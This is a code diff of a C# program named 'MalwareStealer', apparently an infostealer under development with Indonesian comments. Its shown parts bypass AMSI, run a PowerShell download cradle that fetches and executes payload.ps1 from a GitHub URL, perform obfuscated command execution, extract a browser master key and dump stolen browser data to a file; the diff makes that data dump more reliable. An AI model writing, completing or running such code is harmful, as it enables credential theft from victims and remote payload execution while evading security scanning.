@@ -367,8 +367,6 @@ namespace MalwareStealer
         }
 
         // ===== MODUL 4: FILELESS EXECUTION =====
-
-        // 1. PowerShell Download Cradle (pake Invoke-WebRequest)
         static void ExecuteDownloadCradle(string url)
         {
             try
@@ -413,7 +411,6 @@ namespace MalwareStealer
             catch (Exception ex)
             {
                 Console.WriteLine("[-] Error: " + ex.Message);
-                // Fallback: pake Net.WebClient
                 try
                 {
                     Console.WriteLine("[+] Mencoba fallback WebClient...");
@@ -458,7 +455,6 @@ namespace MalwareStealer
             }
         }
 
-        // 2. Obfuscated Execution (whoami)
         static void ExecuteObfuscated()
         {
             try
@@ -490,10 +486,14 @@ namespace MalwareStealer
             }
         }
 
-        // ===== DUMP DATA (DENGAN HASH FALLBACK) =====
+        // ===== DUMP DATA (FINAL - PASTI KELUAR) =====
         static void DumpData(byte[] masterKey)
         {
             string output = @"C:\Stealer\stolen_data.txt";
+            
+            // FORCE BUAT FOLDER SEBELUM APA PUN
+            try { Directory.CreateDirectory(@"C:\Stealer"); } catch { }
+            
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("=== BROWSER STEALER ===");
             sb.AppendLine("Time: " + DateTime.Now.ToString());
@@ -571,30 +571,34 @@ namespace MalwareStealer
                 try { File.Delete(temp); } catch { }
             }
 
-            Directory.CreateDirectory(@"C:\Stealer");
-            File.WriteAllText(output, sb.ToString());
-            Console.WriteLine("[+] Data saved to " + output);
+            // PASTIKAN FILE TERSIMPAN
+            try
+            {
+                Directory.CreateDirectory(@"C:\Stealer");
+                File.WriteAllText(output, sb.ToString());
+                Console.WriteLine("[+] Data saved to " + output);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] Gagal simpan: " + ex.Message);
+            }
+            
             Console.WriteLine("[+] Press any key to exit...");
             Console.ReadKey();
         }
 
-        // ===== MAIN (MODUL 3 + 4) =====
+        // ===== MAIN =====
         static void Main()
         {
             BypassAMSI();
             Console.WriteLine("[+] Malware Stealer Aktif!");
             Console.WriteLine("[+] Modul 4: Fileless Execution");
             
-            // 1. Download Cradle (download payload.ps1 dari GitHub)
             string githubUrl = "https://raw.githubusercontent.com/dailam008/stealer/main/payload.ps1";
             ExecuteDownloadCradle(githubUrl);
-            
-            // 2. Obfuscated Execution
             ExecuteObfuscated();
             
-            // 3. Stealer (MODUL 3)
             byte[] masterKey = null;
-
             Console.WriteLine("[+] Mencoba debugger bypass...");
             masterKey = ExtractMasterKeyViaDebugger();
 
